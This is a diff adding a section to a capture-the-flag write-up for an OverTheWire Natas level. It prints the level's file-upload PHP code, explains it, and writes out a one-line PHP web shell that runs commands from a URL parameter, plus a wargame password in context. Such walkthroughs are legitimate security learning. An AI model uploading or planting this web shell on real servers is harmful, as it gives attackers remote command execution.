@@ -659,8 +659,80 @@ username:```natas12```        password:```YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f5ed8743-ff02-432d-b5a4-bee40815e1ef)
 
+Viewing the source code we get this php code
+
+```php
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
 
 
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+Explaining the code
+```
+1. Function genRandomString generates a random string of length 10.
+2. Function makeRandomPath creates a unique random file path in a given directory with a specified extension.
+3. Function makeRandomPathFromFilename generates a random file path based on a given directory and filename.
+4. If the "filename" key exists in the form data:
+   a. Generate a random file path using makeRandomPathFromFilename.
+   b. Check if the uploaded file size exceeds 1000 bytes.
+   c. If the file size is within limits, move the uploaded file to the target path.
+   d. Display appropriate messages based on the success or failure of the file upload.
+5. If the "filename" key doesn't exist, assume no file upload form was submitted.
+```
+I think we got ourselves here a file upload vulnerability
+
+We'll try uploading a ```.php``` file, since they aren't always up to ```1kb```.
+
+Save this payload ```<?php system($_GET[‘lol’]); ?>``` in a php file
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
+└─$ nano abeg.php
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
+└─$ cat abeg.php 
+<?php system($_GET[‘lol’]); ?>
+```
+Lets try to upload this and intercept using burpsuite
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35408984-bdcd-491e-9ece-705399f1b335)
 
 
 
